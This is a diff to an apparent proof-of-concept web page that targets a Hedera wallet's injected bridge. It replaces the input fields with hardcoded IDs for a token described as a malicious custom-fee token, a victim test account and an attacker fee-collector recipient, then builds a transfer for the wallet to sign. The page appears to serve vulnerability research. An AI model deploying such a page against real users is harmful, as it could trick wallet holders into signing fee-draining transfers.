@@ -28,20 +28,11 @@
 
 <button id="discoverBtn">1. Discover Injected Bridge</button>
 <button id="connectBtn">2. Connect Wallet</button>
-
-<label>Token ID (the malicious custom-fee token, e.g. 0.0.10037892)</label>
-<input id="tokenId" placeholder="0.0.xxxxxxx" />
-
-<label>Sender Account ID (your connected/victim test account)</label>
-<input id="senderId" placeholder="0.0.xxxxxxx" />
-
-<label>Recipient Account ID (attacker/fee-collector or any test account)</label>
-<input id="recipientId" placeholder="0.0.xxxxxxx" />
-
-<label>Amount (smallest unit, e.g. 1000 = 1000 tinytoken units)</label>
-<input id="amount" value="1000" />
-
 <button id="sendBtn">3. Trigger Send (watch the popup)</button>
+
+<div style="margin-top:12px; font-size:12px; color:#777;">
+  Hardcoded: Token 0.0.10037892 | Sender 0.0.10034285 | Recipient 0.0.10015061 | Amount 1
+</div>
 
 <div id="log">Waiting...\n</div>
 
@@ -131,15 +122,11 @@
       return;
     }
     const bridge = window[activeBridgeName];
-    const tokenId = document.getElementById("tokenId").value.trim();
-    const senderId = document.getElementById("senderId").value.trim();
-    const recipientId = document.getElementById("recipientId").value.trim();
-    const amount = parseInt(document.getElementById("amount").value.trim(), 10);
-
-    if (!tokenId || !senderId || !recipientId || !amount) {
-      log("Fill in all fields first.", "err");
-      return;
-    }
+    // Hardcoded PoC values — edit here directly if you need to change them.
+    const tokenId = "0.0.10037892";
+    const senderId = "0.0.10034285";
+    const recipientId = "0.0.10015061";
+    const amount = 1;
 
     log("Building TransferTransaction bytes via bundled @hashgraph/sdk...");
     try {
